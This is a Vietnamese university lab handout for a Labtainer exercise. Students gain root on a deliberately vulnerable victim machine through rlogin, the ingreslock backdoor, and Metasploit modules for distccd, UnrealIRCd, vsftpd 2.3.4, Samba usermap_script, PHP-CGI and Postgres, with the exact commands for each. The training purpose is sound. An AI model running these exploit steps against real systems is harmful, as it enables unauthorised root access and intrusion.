Khai thác lỗ hổng trên các dịch vụ sử dụng Metasploit

Mục đích:
Giúp sinh viên nắm được quy trình và thực hiện một tấn công khai thác lỗ hổng đã biết bằng cách sử dụng công cụ Metasploit.
Yêu cầu đối với sinh viên:
Có kiến thức cơ bản về hệ điều hành Linux, Kali, công cụ metasploit, các lỗ hổng dịch vụ cơ bản: rlogin, ingreslock, distccd, IRC daemon, VSFtpd, Samba, HTTP, Postgres.
Nội dung thực hành
Khởi động bài lab:
Vào terminal, gõ:
labtainer -r metasploit

 (chú ý: sinh viên sử dụng <TÊN_TÀI_KHOẢN> của mình để nhập thông tin người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)

Sau khi khởi động xong hai terminal ảo sẽ xuất hiện, một cái là đại diện cho máy tấn công: attacker, một cái là đại diện cho máy nạn nhân: victim.

Xác định IP của các máy
Trên terminal attacker và victim sử dụng lệnh “ifconfig”, địa chỉ IP sẽ nằm sau “inet adddr:”
Sử dụng câu lệnh “ping” để kiểm tra kết nối từ máy attacker đến máy Victim. Kết quả cần đạt được “ping” thực hiện thành công, có phản hồi từ máy Victim.
Sử dụng công cụ “nmap” để quét các dịch vụ có thể tấn công. Kết quả cần đạt được tìm ra các cổng có thể tấn công vào máy Victimnếu có (trong bài lab mặc định các cổng dịch vụ đều mở để có thể tấn công).
nmap -p0-65535 <IP victim>

Khai thác dịch vụ

Khai thác dịch vụ cấu hình rlogin (cổng 513) để truy nhập từ xa đến máy của Victim (với đặc quyền root). Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
rlogin -l root <IP victim>

cat /root/filetoview.txt

Khai thác dịch vụ ingreslock (cổng 1524). Sử dụng telnet để truy cập vào dịch vụ ingreslock và có được quyền root. Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
telnet <IP victim> <cổng dịch vụ>

cat /root/filetoview.txt

Khai thác dịch vụ distccd (cổng 3632). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công dịch vụ distccd.
search distccd

sử dụng công cụ khai thác “exploit”
use exploit/unix/misc/distcc_exec

xem cấu hình liên quan đến “exploit”
options

Đặt “RHOST”
set RHOST 192.168.1.2

Thực hiện khai thác lỗ hổng
exploit

Khai thác lỗ hổng IRC daemon (cổng 6667). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng unreal_ircd.
search unreal_ircd

sử dụng công cụ khai thác “exploit”
use exploit/unix/irc/unreal_ircd_3281_backdoor

đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
Khai thác dịch vụ VSFtpd (cổng 21). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng vsftpd_234.
search vsftpd_234

sử dụng công cụ khai thác “exploit”
use exploit/unix/ftp/vsftpd_234_backdoor

đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
Khai thác dịch vụ Samba service (cổng 139). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng samba usermap_script.
search usermap_script

sử dụng công cụ khai thác “exploit”
use exploit/multi/samba/usermap_script

đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
Khai thác dịch vụ HTTP (cổng 80). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng php_cgi.
search php_cgi

sử dụng công cụ khai thác “exploit”
use exploit/multi/http/php_cgi_arg_injection

đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
Khai thác dịch vụ Postgres (cổng 5432). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng postgres_payload.
search postgres_payload

sử dụng công cụ khai thác “exploit”
use exploit/linux/postgres/postgres_payload

đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
Kết thúc bài lab:
Trên terminal đầu tiên sử dụng câu lênh sau để kết thúc bài lab:
stoplab metasploit
